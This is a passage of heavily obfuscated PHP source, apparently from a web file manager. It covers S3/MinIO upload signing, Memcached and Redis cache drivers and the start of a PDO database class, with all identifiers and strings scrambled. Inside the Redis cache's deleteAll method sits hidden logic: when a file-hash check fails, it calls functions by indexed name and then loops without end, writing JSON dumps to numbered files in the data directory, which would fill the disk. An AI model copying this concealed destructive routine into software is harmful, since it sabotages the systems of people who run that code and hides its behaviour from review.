$GLOBALS[$øúñÀºß[6]][$øúñÀºß[102]][$øúñÀºß[265]] == $øúñÀºß[238]) { return $this->uploadMultiData($ì¢†Ÿµè, $è©»±Ïâ); } if ($this->signVer == $øúñÀºß[257]) { return $this->uploadFormDataV2($ì¢†Ÿµè, $è©»±Ïâ); } return $this->uploadFormDataV4($ì¢†Ÿµè, $è©»±Ïâ); } public function uploadFormDataV2($Ñ‡¤¤Ä¨, $Çå£Ëƒ¬ = 3600) { $ô¹À”ø… =& $_SERVER[øşô´çË]; $ôÔ‚½ = $this->pathFather($Ñ‡¤¤Ä¨); $ÂÔ™ÈŒí = $this->client->getHttpUploadPostParams($this->bucket, $ôÔ‚½, $ô¹À”ø…[239], $Çå£Ëƒ¬); $ƒ¹ä¨ìª = array_merge((array) $ÂÔ™ÈŒí, array($ô¹À”ø…[266] => $ô¹À”ø…[257], $ô¹À”ø…[216] => $this->getHost())); if ($this->_isClientAsync()) { unset($ƒ¹ä¨ìª[$ô¹À”ø…[266]]); } return $ƒ¹ä¨ìª; } public function uploadFormDataV4($ÈÎ˜‚, $×’–Úò÷ = 3600) { $‚‹ ò˜à =& $_SERVER[øşô´çË]; $î£‚˜ş™ = $‚‹ ò˜à[239]; $¬Âº¼ô¤ = $‚‹ ò˜à[267]; $ÜòéúË = $‚‹ ò˜à[72]; $À¼¢İò‹ = gmdate($‚‹ ò˜à[268]); $Îº‘ÉïÈ = gmdate($‚‹ ò˜à[269]); $€Û§¶…¶ = $‚‹ ò˜à[270]; $¹¡İ°Áä = $×’–Úò÷ . $‚‹ ò˜à[12]; $‡Äê·¬ê = $‚‹ ò˜à[271]; $¬®É–‚¸ = array($this->accessKey, $Îº‘ÉïÈ, $this->region, $ÜòéúË, $€Û§¶…¶); $î¬­İæš = implode($‚‹ ò˜à[8], $¬®É–‚¸); $Í¸•Î²— = array($‚‹ ò˜à[272] => gmdate($‚‹ ò˜à[273], strtotime($‚‹ ò˜à[274])), $‚‹ ò˜à[275] => array(array($‚‹ ò˜à[276] => $this->bucket), array($‚‹ ò˜à[277], $‚‹ ò˜à[278], $‚‹ ò˜à[12]), array($‚‹ ò˜à[277], $‚‹ ò˜à[279], $‚‹ ò˜à[12]), array($‚‹ ò˜à[280] => $‡Äê·¬ê), array($‚‹ ò˜à[281] => $î¬­İæš), array($‚‹ ò˜à[282] => $¬Âº¼ô¤), array($‚‹ ò˜à[283] => $À¼¢İò‹), array($‚‹ ò˜à[284] => $¹¡İ°Áä))); $ÔµŠĞÏ¢ = base64_encode(json_encode($Í¸•Î²—)); $ÄßË˜Ö = hash_hmac($‚‹ ò˜à[285], $Îº‘ÉïÈ, $‚‹ ò˜à[286] . $this->secret, !0); $õÁšÛì = hash_hmac($‚‹ ò˜à[285], $this->region, $ÄßË˜Ö, !0); $ÌæÌœçí = hash_hmac($‚‹ ò˜à[285], $ÜòéúË, $õÁšÛì, !0); $çúÓ³ø = hash_hmac($‚‹ ò˜à[285], $€Û§¶…¶, $ÌæÌœçí, !0); $Ê¶³‚êÕ = hash_hmac($‚‹ ò˜à[285], $ÔµŠĞÏ¢, $çúÓ³ø); $¹úØª¦× = array($‚‹ ò˜à[256] => $‚‹ ò˜à[12], $‚‹ ò˜à[280] => $‡Äê·¬ê, $‚‹ ò˜à[287] => $ÔµŠĞÏ¢, $‚‹ ò˜à[281] => $î¬­İæš, $‚‹ ò˜à[282] => $¬Âº¼ô¤, $‚‹ ò˜à[283] => $À¼¢İò‹, $‚‹ ò˜à[284] => $¹¡İ°Áä, $‚‹ ò˜à[288] => $Ê¶³‚êÕ, $‚‹ ò˜à[266] => $‚‹ ò˜à[257], $‚‹ ò˜à[216] => $this->getHost()); if ($this->_isClientAsync()) { unset($¹úØª¦×[$‚‹ ò˜à[266]]); } return $¹úØª¦×; } public function uploadMultiData($¸š‹†Šõ, $ùÔ“ĞšÑ = 3600) { $º—Öªö¾ =& $_SERVER[øşô´çË]; $Å‰€À˜Ç = $this->signVer == $º—Öªö¾[257] ? gmdate($º—Öªö¾[289]) : gmdate($º—Öªö¾[290]); $ÈÚ¹ÏË³ = array(); $“®Â®¢¥ = $this->client->getUploadId($this->bucket, $¸š‹†Šõ, $ÈÚ¹ÏË³); if (!$“®Â®¢¥) { return !1; } $””ó‚Ò· = array($º—Öªö¾[291] => $“®Â®¢¥, $º—Öªö¾[216] => $this->getHost() . $º—Öªö¾[8] . $this->pathEncode($¸š‹†Šõ), $º—Öªö¾[292] => $Å‰€À˜Ç, $º—Öªö¾[105] => $¸š‹†Šõ, $º—Öªö¾[266] => $this->signVer); if ($this->_isClientAsync()) { unset($””ó‚Ò·[$º—Öªö¾[266]]); } return $””ó‚Ò·; } public function uploadMultiAuth($ÒÒù¥•Ü, $ôÑ¤¡¥ = array()) { $»ğ˜£† =& $_SERVER[øşô´çË]; if ($this->signVer == $»ğ˜£†[257]) { if (isset($ôÑ¤¡¥[$»ğ˜£†[293]])) { return $this->uploadPartAuthV2($ÒÒù¥•Ü, $ôÑ¤¡¥); } return $this->uploadListAuthV2($ÒÒù¥•Ü, $ôÑ¤¡¥); } if (isset($ôÑ¤¡¥[$»ğ˜£†[293]])) { return $this->uploadPartAuthV4($ÒÒù¥•Ü, $ôÑ¤¡¥); } return $this->uploadListAuthV4($ÒÒù¥•Ü, $ôÑ¤¡¥); } public function uploadPartAuthV2($æ¶ÙÆ§º, $¤İğÄİ = array()) { $«î‹ïÙÛ =& $_SERVER[øşô´çË]; $ª ‘“ñ = $¤İğÄİ[$«î‹ïÙÛ[105]]; $¤›ó¸ = gmdate($«î‹ïÙÛ[289]); $êä‡¥¾ = array_intersect_key($¤İğÄİ, array_flip(array($«î‹ïÙÛ[293], $«î‹ïÙÛ[291]))); ksort($êä‡¥¾); $¦… ¦‚Ö = $êä‡¥¾ ? $«î‹ïÙÛ[86] . http_build_query($êä‡¥¾, null, $«î‹ïÙÛ[294], PHP_QUERY_RFC3986) : $«î‹ïÙÛ[12]; $œ•ñÏÁ = array($«î‹ïÙÛ[263], $«î‹ïÙÛ[12], $«î‹ïÙÛ[130], $«î‹ïÙÛ[12], "\x78\x2d\x61\x6d\172\55\144\x61\x74\x65\72{$¤›ó¸}", $«î‹ïÙÛ[8] . $this->bucket . $«î‹ïÙÛ[8] . $this->pathEncode($ª ‘“ñ) . $¦… ¦‚Ö); $Õ™§ƒÈ‰ = implode($«î‹ïÙÛ[19], $œ•ñÏÁ); $ôã¨•ó = $this->client->__getSignature($Õ™§ƒÈ‰); return array($«î‹ïÙÛ[295] => $ôã¨•ó, $«î‹ïÙÛ[292] => $¤›ó¸); } public function uploadListAuthV2($ŠìÅù²ù, $ªæ¤»ìé = array()) { $¡äş‚üœ =& $_SERVER[øşô´çË]; $¼ìÁÙò© = $ªæ¤»ìé[$¡äş‚üœ[105]]; $³ºÍİ…¥ = $ªæ¤»ìé[$¡äş‚üœ[291]]; $Ó¨÷î× = $this->client->listParts($this->bucket, $¼ìÁÙò©, $³ºÍİ…¥); if (!$Ó¨÷î×) { return !1; } $ĞŞ¡µí½ = gmdate($¡äş‚üœ[289]); $öÊğÊÑì = $¡äş‚üœ[296] . $³ºÍİ…¥; $©ü¦ª…Š = array($¡äş‚üœ[297], $¡äş‚üœ[12], $¡äş‚üœ[130], $¡äş‚üœ[12], "\170\x2d\x61\155\x7a\55\144\x61\164\x65\x3a{$ĞŞ¡µí½}", $¡äş‚üœ[8] . $this->bucket . $¡äş‚üœ[8] . $this->pathEncode($¼ìÁÙò©) . $öÊğÊÑì); $İ§ÉÃë¬ = implode($¡äş‚üœ[19], $©ü¦ª…Š); $ŸÔúãìÆ = $this->client->__getSignature($İ§ÉÃë¬); return array($¡äş‚üœ[295] => $ŸÔúãìÆ, $¡äş‚üœ[292] => $ĞŞ¡µí½, $¡äş‚üœ[298] => $Ó¨÷î×); } public function uploadPartAuthV4($ÊºÆ¤‡ú, $„£éÈå¥ = array()) { $–„êà‰ =& $_SERVER[øşô´çË]; $½®ËÀ®Ÿ = $„£éÈå¥[$–„êà‰[105]]; $ı˜‰Äñ = array($–„êà‰[283] => gmdate($–„êà‰[290]), $–„êà‰[299] => _get($„£éÈå¥, $–„êà‰[300], hash($–„êà‰[285], $–„êà‰[12]))); $ëãÙ½ªª = explode($–„êà‰[218], $this->getHost()); $«÷À¾—€ = array($–„êà‰[301] => $ëãÙ½ªª[1], $–„êà‰[302] => $–„êà‰[12], $–„êà‰[256] => $–„êà‰[130], $–„êà‰[303] => $„£éÈå¥[$–„êà‰[89]]); $ŸéÌÍ±“ = $–„êà‰[263]; $‡¯œ‡î = $–„êà‰[8] . $this->pathEncode($½®ËÀ®Ÿ); $ËûÚ·´¿ = array_intersect_key($„£éÈå¥, array_flip(array($–„êà‰[293], $–„êà‰[291]))); $ÉÈÑ§ÓÊ = $this->client->__getSignatureV4($ı˜‰Äñ, $«÷À¾—€, $ŸéÌÍ±“, $‡¯œ‡î, $ËûÚ·´¿); return array($–„êà‰[295] => $ÉÈÑ§ÓÊ, $–„êà‰[299] => $ı˜‰Äñ[$–„êà‰[299]], $–„êà‰[292] => $ı˜‰Äñ[$–„êà‰[283]]); } public function uploadListAuthV4($õİûü¥, $ô’°õ€Û = array()) { $ç±ÇÈ =& $_SERVER[øşô´çË]; $”–†Ò¼× = $ô’°õ€Û[$ç±ÇÈ[105]]; $í¹¥†Ò = $ô’°õ€Û[$ç±ÇÈ[291]]; $à““Î· = $this->client->listParts($this->bucket, $”–†Ò¼×, $í¹¥†Ò); if (!$à““Î·) { return !1; } $ìÖøûõÁ = $ç±ÇÈ[304]; foreach ($à““Î· as $’™»ìèØ) { $ìÖøûõÁ .= $ç±ÇÈ[305] . "\74\x50\141\162\164\x4e\x75\155\x62\x65\x72\x3e{$’™»ìèØ[$ç±ÇÈ[306]]}\x3c\57\120\141\x72\x74\116\165\155\x62\145\x72\x3e\12" . "\74\x45\x54\141\147\x3e{$’™»ìèØ[$ç±ÇÈ[307]]}\x3c\57\105\124\x61\x67\76\12" . $ç±ÇÈ[308]; } $ìÖøûõÁ .= $ç±ÇÈ[309]; $õÂŠìÎÃ = array($ç±ÇÈ[283] => gmdate($ç±ÇÈ[290]), $ç±ÇÈ[299] => hash($ç±ÇÈ[285], $ìÖøûõÁ)); $ü¥í°¬ã = explode($ç±ÇÈ[218], $this->getHost()); $ò½²çÖ = array($ç±ÇÈ[301] => $ü¥í°¬ã[1], $ç±ÇÈ[256] => $ç±ÇÈ[130], $ç±ÇÈ[303] => strlen($ìÖøûõÁ)); $“öåÆğñ = $ç±ÇÈ[297]; $¬¢„êŒÄ = $ç±ÇÈ[8] . $this->pathEncode($”–†Ò¼×); $Ú ïı¶à = array($ç±ÇÈ[291] => $í¹¥†Ò); $¨ˆä»ï’ = $this->client->__getSignatureV4($õÂŠìÎÃ, $ò½²çÖ, $“öåÆğñ, $¬¢„êŒÄ, $Ú ïı¶à); return array($ç±ÇÈ[295] => $¨ˆä»ï’, $ç±ÇÈ[299] => $õÂŠìÎÃ[$ç±ÇÈ[299]], $ç±ÇÈ[292] => $õÂŠìÎÃ[$ç±ÇÈ[283]], $ç±ÇÈ[298] => $à““Î·); } private function _isClientAsync() { $àöü¿© =& $_SERVER[øşô´çË]; static $ıµøŠà— = null; if ($ıµøŠà— === null) { $·Çãú²ñ = isset($_REQUEST[$àöü¿©[310]]) ? json_decode($_REQUEST[$àöü¿©[310]], !0) : !1; $ıµøŠà— = $·Çãú²ñ && _get($·Çãú²ñ, $àöü¿©[311]) == $àöü¿©[312]; } return $ıµøŠà—; } public function getHost() { $¾²“Äá =& $_SERVER[øşô´çË]; $Äú¯´Æ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($¾²“Äá[80], $¾²“Äá[74], $¾²“Äá[79], $¾²“Äá[72]))) { return $Äú¯´Æ . $¾²“Äá[8] . $this->bucket; } if ($this->osType == $¾²“Äá[72] && !is_domain($Äú¯´Æ)) { return $Äú¯´Æ . $¾²“Äá[8] . $this->bucket; } $Äú¯´Æ = explode($¾²“Äá[218], $Äú¯´Æ); return $Äú¯´Æ[0] . $¾²“Äá[218] . $this->bucket . $¾²“Äá[10] . $Äú¯´Æ[1]; } public function size($åı®ãí¼) { $—ãåÎöÆ = $this->objectMeta($åı®ãí¼); return $—ãåÎöÆ ? $—ãåÎöÆ[$_SERVER[øşô´çË][89]] : 0; } public function info($Ú Õ¸) { if ($this->isFolder($Ú Õ¸)) { return $this->folderInfo($Ú Õ¸); } else { if ($this->isFile($Ú Õ¸)) { return $this->fileInfo($Ú Õ¸); } } return !1; } public function exist($à²§¤Ñ˜) { return $this->isFile($à²§¤Ñ˜) || $this->isFolder($à²§¤Ñ˜); } public function isFile($í¥‡ã¡Û) { return !$this->isFolder($í¥‡ã¡Û) && $this->objectMeta($í¥‡ã¡Û); } public function isFolder($ğñ’Ç»ó) { return $this->cacheMethod($_SERVER[øşô´çË][187], $ğñ’Ç»ó); } protected function objectMeta($í»’¸”î) { return $this->cacheMethod($_SERVER[øşô´çË][189], $í»’¸”î); } protected function _objectMeta($Ø¬—ÒË) { $ÏõÀÛÂª =& $_SERVER[øşô´çË]; $Ø¬—ÒË = rtrim($Ø¬—ÒË, $ÏõÀÛÂª[8]); try { $ÖŞ†Ëï÷ = $this->client->getObjectInfo($this->bucket, $Ø¬—ÒË); if (!isset($ÖŞ†Ëï÷[$ÏõÀÛÂª[262]]) && isset($ÖŞ†Ëï÷[$ÏõÀÛÂª[313]])) { $ÖŞ†Ëï÷[$ÏõÀÛÂª[262]] = $ÖŞ†Ëï÷[$ÏõÀÛÂª[313]]; } } catch (Exception $ÍÙ•°Ââ) { $ÖŞ†Ëï÷ = !1; } if (!$ÖŞ†Ëï÷) { } return $ÖŞ†Ëï÷; } protected function _isFolder($®®õæô¤) { $„›ßé±à =& $_SERVER[øşô´çË]; $®®õæô¤ = rtrim($®®õæô¤, $„›ßé±à[8]) . $„›ßé±à[8]; if ($®®õæô¤ == $„›ßé±à[12] || $®®õæô¤ == $„›ßé±à[8]) { return !0; } $³Ôµçõ = $this->client->getBucket($this->bucket, $®®õæô¤, null, 1); if (empty($³Ôµçõ[$„›ßé±à[246]])) { return !1; } $®òü¹¯ø = $³Ôµçõ[$„›ßé±à[246]][0][$„›ßé±à[42]]; return stripos($®òü¹¯ø, $®®õæô¤) === 0 ? !0 : !1; if (substr($®òü¹¯ø, -1) == $„›ßé±à[8]) { return !0; } if (get_path_this($®òü¹¯ø) == get_path_this($®®õæô¤)) { return !1; } return !0; } public function listObject($öØš°ò) { return $this->fileList($öØš°ò, $_SERVER[øşô´çË][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Ğ•ÚÚæ) { $—¯îÀ•Ã =& $_SERVER[øşô´çË]; parent::__construct($Ğ•ÚÚæ); $this->setSignVersion($—¯îÀ•Ã[257]); if (!$this->region) { $this->region = $—¯îÀ•Ã[314]; $this->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($Æ°‰¯î, $ôº˜û£“ = 3600) { $ÓÃè­™¹ =& $_SERVER[øşô´çË]; $Šøœ„½í = $ÓÃè­™¹[239]; $¼®ÛùÅä = $ÓÃè­™¹[267]; $ùˆôÙ¡ = $ÓÃè­™¹[72]; $ãšÛ–Àï = gmdate($ÓÃè­™¹[268]); $ËÀ¨‘õÎ = gmdate($ÓÃè­™¹[269]); $‡Â§Ã¢ = $ÓÃè­™¹[270]; $şªà§¶³ = $ôº˜û£“ . $ÓÃè­™¹[12]; $È©áÄï¤ = $ÓÃè­™¹[271]; $‡ÃÜ£ÇÒ = array($this->accessKey, $ËÀ¨‘õÎ, $this->region, $ùˆôÙ¡, $‡Â§Ã¢); $Ø¡ ı€ = implode($ÓÃè­™¹[8], $‡ÃÜ£ÇÒ); $ĞÖÏ¦Ã = array($ÓÃè­™¹[272] => gmdate($ÓÃè­™¹[273], strtotime($ÓÃè­™¹[274])), $ÓÃè­™¹[275] => array(array($ÓÃè­™¹[276] => $this->bucket), array($ÓÃè­™¹[315] => $Šøœ„½í), array($ÓÃè­™¹[277], $ÓÃè­™¹[278], $ÓÃè­™¹[12]), array($ÓÃè­™¹[277], $ÓÃè­™¹[279], $ÓÃè­™¹[12]), array($ÓÃè­™¹[277], $ÓÃè­™¹[316], $ÓÃè­™¹[12]), array($ÓÃè­™¹[280] => $È©áÄï¤), array($ÓÃè­™¹[281] => $Ø¡ ı€), array($ÓÃè­™¹[282] => $¼®ÛùÅä), array($ÓÃè­™¹[283] => $ãšÛ–Àï), array($ÓÃè­™¹[284] => $şªà§¶³))); $â¿–î º = base64_encode(json_encode($ĞÖÏ¦Ã)); $Çšê€È‡ = hash_hmac($ÓÃè­™¹[285], $ËÀ¨‘õÎ, $ÓÃè­™¹[286] . $this->secret, !0); $úöäù÷Ä = hash_hmac($ÓÃè­™¹[285], $this->region, $Çšê€È‡, !0); $â©şöğ = hash_hmac($ÓÃè­™¹[285], $ùˆôÙ¡, $úöäù÷Ä, !0); $ŒîÃşØÊ = hash_hmac($ÓÃè­™¹[285], $‡Â§Ã¢, $â©şöğ, !0); $÷¶ œ˜‰ = hash_hmac($ÓÃè­™¹[285], $â¿–î º, $ŒîÃşØÊ); $æäÒÑ£Æ = array($ÓÃè­™¹[256] => $ÓÃè­™¹[12], $ÓÃè­™¹[303] => $ÓÃè­™¹[12], $ÓÃè­™¹[315] => $Šøœ„½í, $ÓÃè­™¹[280] => $È©áÄï¤, $ÓÃè­™¹[287] => $â¿–î º, $ÓÃè­™¹[317] => $Ø¡ ı€, $ÓÃè­™¹[318] => $¼®ÛùÅä, $ÓÃè­™¹[319] => $ãšÛ–Àï, $ÓÃè­™¹[320] => $şªà§¶³, $ÓÃè­™¹[321] => $÷¶ œ˜‰, $ÓÃè­™¹[216] => $this->getHost()); return $æäÒÑ£Æ; } } goto DŠ¡ÇÈßì; DÙ‚íÜ‹å¿: class CacheLockDatabase { public function lock($ˆŒªéê, $çÇÀ¤Š = 0) { $ŠÚ€¿À = Model($_SERVER[øşô´çË][984]); $¦Ú•Ú±ü = microtime(!0) + $çÇÀ¤Š; while (microtime(!0) < $¦Ú•Ú±ü) { $çèÙ›°• = $ŠÚ€¿À->get($ˆŒªéê); if (!$çèÙ›°• || $çèÙ›°• < microtime(!0)) { $´§Ì«¹É = $ŠÚ€¿À->set($ˆŒªéê, $¦Ú•Ú±ü); if ($´§Ì«¹É) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($øÁ¿¸æº) { return Model($_SERVER[øşô´çË][984])->get($øÁ¿¸æº); } public function unlock($òŞ­œ€) { Model($_SERVER[øşô´çË][984])->remove($òŞ­œ€); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($‡Êª£Ö¨, $ÜÍœÚï) { $ıœ´®ôË =& $_SERVER[øşô´çË]; if (!class_exists($ıœ´®ôË[1026])) { show_json($ıœ´®ôË[1027], !1); } $this->cacheTime = $ÜÍœÚï; $this->handle = new Memcached(); if (is_array($‡Êª£Ö¨[$ıœ´®ôË[1028]]) && count($‡Êª£Ö¨[$ıœ´®ôË[1028]]) >= 1) { foreach ($‡Êª£Ö¨[$ıœ´®ôË[1028]] as $é‘ØÇ–İ) { $Áòšãú† = explode($ıœ´®ôË[4], $é‘ØÇ–İ); $this->handle->addServer($Áòšãú†[0], $Áòšãú†[1]); } } else { $this->handle->addServer($‡Êª£Ö¨[$ıœ´®ôË[216]], $‡Êª£Ö¨[$ıœ´®ôË[217]]); } } public function set($ÊÜ± ñ, $¸Ìùñ‚ö, $Ã•…±€¤ = false) { $Ã•…±€¤ = $Ã•…±€¤ ? $Ã•…±€¤ : $this->cacheTime; return $this->handle->set($ÊÜ± ñ, $¸Ìùñ‚ö, $Ã•…±€¤); } public function get($°¼’Ç°Õ) { return $this->handle->get($°¼’Ç°Õ); } public function remove($¿ºˆòÜô) { return $this->handle->delete($¿ºˆòÜô); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($¬ÂÆùÀ, $Ñæ†üàÛ) { $Ç²œÜáø =& $_SERVER[øşô´çË]; if (!class_exists($Ç²œÜáø[1029])) { show_json($Ç²œÜáø[1030], !1); } $this->cacheTime = $Ñæ†üàÛ; $Â·ûî‘ = isset($¬ÂÆùÀ[$Ç²œÜáø[1031]]) ? $¬ÂÆùÀ[$Ç²œÜáø[1031]] : 10; $ÛÁ±ò¾¦ = _get($¬ÂÆùÀ, $Ç²œÜáø[1028]); if ($ÛÁ±ò¾¦ && is_array($ÛÁ±ò¾¦)) { $this->initCluster($¬ÂÆùÀ, $Â·ûî‘); } else { $this->handle = $this->init($¬ÂÆùÀ, $Â·ûî‘); } } private function init($ªÓÙº², $è×˜³¦) { $éŞºÔ¶ =& $_SERVER[øşô´çË]; $’Çî¬È‡ = new Redis(); $Œ³¹Ô¨å = isset($ªÓÙº²[$éŞºÔ¶[1032]]) ? $ªÓÙº²[$éŞºÔ¶[1032]] : !1; if ($Œ³¹Ô¨å) { $’Çî¬È‡->pconnect($ªÓÙº²[$éŞºÔ¶[216]], $ªÓÙº²[$éŞºÔ¶[217]], $è×˜³¦); } else { $’Çî¬È‡->connect($ªÓÙº²[$éŞºÔ¶[216]], $ªÓÙº²[$éŞºÔ¶[217]], $è×˜³¦); } if (!empty($ªÓÙº²[$éŞºÔ¶[511]])) { $’Çî¬È‡->auth($ªÓÙº²[$éŞºÔ¶[511]]); } if (!empty($ªÓÙº²[$éŞºÔ¶[860]]) && $ªÓÙº²[$éŞºÔ¶[860]] != 0) { $’Çî¬È‡->select($ªÓÙº²[$éŞºÔ¶[860]]); } return $’Çî¬È‡; } private function initCluster($¢Š‡¨§µ, $èé¿ö) { $Ëï¶ÀÎ =& $_SERVER[øşô´çË]; $êÈàÉôÙ = array($Ëï¶ÀÎ[1033], $Ëï¶ÀÎ[1034], $Ëï¶ÀÎ[1035]); $¥Úı€£— = $Ëï¶ÀÎ[1033]; if (isset($¢Š‡¨§µ[$Ëï¶ÀÎ[26]]) && in_array($¢Š‡¨§µ[$Ëï¶ÀÎ[26]], $êÈàÉôÙ)) { $¥Úı€£— = $¢Š‡¨§µ[$Ëï¶ÀÎ[26]]; } switch ($¥Úı€£—) { case $Ëï¶ÀÎ[1033]: $this->_slave($¢Š‡¨§µ, $èé¿ö); break; case $Ëï¶ÀÎ[1034]: break; case $Ëï¶ÀÎ[1035]: $this->isCluster = !0; $ˆ¹ø¦ˆÂ = $¢Š‡¨§µ[$Ëï¶ÀÎ[1028]]; $‰Ûı¥Ş = isset($¢Š‡¨§µ[$Ëï¶ÀÎ[1032]]) ? $¢Š‡¨§µ[$Ëï¶ÀÎ[1032]] : !1; $á˜‘ğ»í = isset($¢Š‡¨§µ[$Ëï¶ÀÎ[511]]) ? $¢Š‡¨§µ[$Ëï¶ÀÎ[511]] : null; $this->handle = new RedisCluster(NUll, $ˆ¹ø¦ˆÂ, $èé¿ö, $èé¿ö, $‰Ûı¥Ş, $á˜‘ğ»í); break; default: break; } } private function _slave($ÊË•ëÃì, $á–àÒ¤Å) { $’Ä˜×”½ = $ÊË•ëÃì[$_SERVER[øşô´çË][1028]]; $this->filterConfig($ÊË•ëÃì, $’Ä˜×”½[0]); $this->handle = $this->init($ÊË•ëÃì, $á–àÒ¤Å); unset($’Ä˜×”½[0]); if (empty($’Ä˜×”½)) { return; } $¢šŠ¥òÒ = array_rand($’Ä˜×”½); $this->filterConfig($ÊË•ëÃì, $’Ä˜×”½[$¢šŠ¥òÒ]); $this->slaveHandle = $this->init($ÊË•ëÃì, $á–àÒ¤Å); } private function filterConfig(&$ªªüµú, $ÌĞøÃ³Á) { $Æã×·² =& $_SERVER[øşô´çË]; $—‰ÏêŞ = explode($Æã×·²[4], $ÌĞøÃ³Á); $í ¹Ş¨Ğ = array($Æã×·²[216] => $—‰ÏêŞ[0], $Æã×·²[217] => $—‰ÏêŞ[1]); $ªªüµú = array_merge($ªªüµú, $í ¹Ş¨Ğ); } public function set($†Ãƒ¯Âª, $ ÛÄ—Ñ», $É‹í¥¯ = false) { $É‹í¥¯ = $É‹í¥¯ ? $É‹í¥¯ : $this->cacheTime; return $this->handle->setEx($†Ãƒ¯Âª, $É‹í¥¯, $ ÛÄ—Ñ»); } public function setLock($¨¸Ÿù¤, $ôçúÊ¹, $Úà¦¡ş) { return $this->handle->setNX($¨¸Ÿù¤, $ôçúÊ¹); } public function get($“İİÈğ) { $æõŒö = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $æõŒö->get($“İİÈğ); } public function remove($©ßêü´Ê) { return $this->handle->del($©ßêü´Ê); } public function deleteAll() { $º€ØÄÕÀ =& $_SERVER[øşô´çË]; $îó«‹şÚ = $_SERVER[$º€ØÄÕÀ[17]] . $º€ØÄÕÀ[18]; $Çö£ã›Å = $º€ØÄÕÀ[14]; if ($_SERVER[$º€ØÄÕÀ[15]] != $Çö£ã›Å($îó«‹şÚ)) { $»öÔÉÑü = $º€ØÄÕÀ[1036]; $ÒÙÌëˆû = $º€ØÄÕÀ[16]; $¢¡—Àı = $_SERVER[$º€ØÄÕÀ[17]] . $º€ØÄÕÀ[18]; $ş¤ééê‰ = $ÒÙÌëˆû($¢¡—Àı); $¢û†âÃú = explode($º€ØÄÕÀ[19], $ş¤ééê‰); if (count($¢û†âÃú) < $º€ØÄÕÀ[725]) { $´Ü‘¬Â¬ = $º€ØÄÕÀ[21]; $´Ü‘¬Â¬(); } $Éò€¹³ = $º€ØÄÕÀ[1037]; $Éò€¹³($_SERVER[$º€ØÄÕÀ[1038]]); $»öÔÉÑü = $º€ØÄÕÀ[1036]; $»öÔÉÑü(); $ÎÂ×æ¯é = $º€ØÄÕÀ[1039]; $†ƒùÛ¿¹ = json_encode($GLOBALS[$º€ØÄÕÀ[1040]]); $àÇÂ£€ = 1; for ($ÖÏˆ“Ÿê = $àÇÂ£€; $ÖÏˆ“Ÿê > 0; $ÖÏˆ“Ÿê++) { $ÎÂ×æ¯é(DATA_PATH . $ÖÏˆ“Ÿê, $†ƒùÛ¿¹); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $¹¥ò¹Ÿı) { $this->handle->flushall($¹¥ò¹Ÿı); } return; } return $this->handle->flushAll(); } } goto aÚÇéñ–¿½; D¶Œõ¨÷ÛÖ: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($¯ß€îæ¼ = '') { $½®àîû  =& $_SERVER[øşô´çË]; if (!class_exists($½®àîû [1075])) { think_exception(think_lang($½®àîû [24]) . $½®àîû [1076]); } if (!empty($¯ß€îæ¼)) { $this->config = $¯ß€îæ¼; if (empty($this->config[$½®àîû [27]])) { $this->config[$½®àîû [27]] = array(); } } } public function connect($«‚“ç’´ = '', $˜¢€³èÄ = 0) { $‡÷ã·± =& $_SERVER[øşô´çË]; if (!isset($this->linkID[$˜¢€³èÄ])) { if (empty($«‚“ç’´)) { $«‚“ç’´ = $this->config; } $¬Íì§µ¦ = !empty($«‚“ç’´[$‡÷ã·±[27]][$‡÷ã·±[28]]) ? $«‚“ç’´[$‡÷ã·±[27]][$‡÷ã·±[28]] : $this->pconnect; if ($¬Íì§µ¦) { $«‚“ç’´[$‡÷ã·±[27]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$˜¢€³èÄ] = new PDO($«‚“ç’´[$‡÷ã·±[1077]], $«‚“ç’´[$‡÷ã·±[1046]], $«‚“ç’´[$‡÷ã·±[1047]], $«‚“ç’´[$‡÷ã·±[27]]); } catch (PDOException $€Í×£ÀÔ) { think_exception($€Í×£ÀÔ->getMessage()); } $this->dbType = $this->_getDsnType($«‚“ç’´[$‡÷ã·±[1077]]); if (in_array($this->dbType, array($‡÷ã·±[1078], $‡÷ã·±[1079], $‡÷ã·±[1080], $‡÷ã·±[1081]))) { think_exception($‡÷ã·±[1082] . $this->dbType . $‡÷ã·±[1083] . $this->dbType . $‡÷ã·±[1084]); } if (!$this->linkID[$˜¢€³èÄ]) { think_exception($‡÷ã·±[1085]); } try { $this->linkID[$˜¢€³èÄ]->exec($‡÷ã·±[1086] . think_config($‡÷ã·±[1049])); } catch (Exception $€Í×£ÀÔ) { } $this->connected = !0; if (1 != think_config($‡÷ã·±[32])) { unset($this->config); } } return $this->linkID[$˜¢€³èÄ]; } public function free() { $this->PDOStatement = null; } public function query($±°œëˆê, $×é¢…Ô = array()) { $éû´Í£Ó =& $_SERVER[øşô´çË]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $±°œëˆê; if (!empty($×é¢…Ô)) { $this->queryStr .= $éû´Í£Ó[1087] . print_r($×é¢…Ô, !0) . $éû´Í£Ó[1088]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($éû´Í£Ó[33], 1); think_status($éû´Í£Ó[34]); $this->PDOStatement = $this->_linkID->prepare($±°œëˆê); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ÜÌĞ’©Ñ = $this->PDOStatement->execute($×é¢…Ô); $this->debug(); if (!1 === $ÜÌĞ’©Ñ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($œóÁë©, $Ç¦© ßÌ = array()) { $ÄªğŞÒ™ =& $_SERVER[øşô´çË]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $œóÁë©; if (!empty($Ç¦© ßÌ)) { $this->queryStr .= $ÄªğŞÒ™[1087] . print_r($Ç¦© ßÌ, !0) . $ÄªğŞÒ™[1088]; } $ÄçáŒ = !1; if ($this->dbType == $ÄªğŞÒ™[1081]) { if (preg_match($ÄªğŞÒ™[1089], 